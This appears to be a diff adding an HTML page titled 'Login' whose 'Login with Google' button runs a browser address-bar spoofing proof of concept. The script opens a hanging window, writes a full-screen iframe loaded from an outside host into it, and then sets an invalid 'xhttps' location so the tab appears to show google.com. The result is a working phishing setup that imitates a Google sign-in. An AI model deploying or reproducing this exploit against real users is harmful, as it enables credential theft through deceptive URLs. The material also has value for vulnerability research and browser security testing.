@@ -1,0 +1,61 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <script>
+        function poc() {
+// Opening an invalid website that will hang the tab and keep it without a URL 
+var v = window.open('https://bing.com:81/');
+
+// Use document.write() to add our content to the page, this will stop the page load and the page is without a URL
+setTimeout(()=>{v.document.write('<iframe src="https://pwr.wtf/arc/1.html" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>')},100);
+
+// Change location to our spoofed location with an invalid protocol scheme 
+setTimeout(()=>{v.location='xhttps://www.google.com/'},200);
+
+
+        }
+    </script>
+   <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f5f5f7;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        .container {
+display: none;
+            text-align: center;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        }
+button{
+background-color: #4285f4;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+}
+    </style>
+</head>
+<body>
+
+    <div id="landing" >
+        <h1>
+        <button onclick="poc()">Login with Google</button></h1>
+    </div>
+
+</body>
+</html>
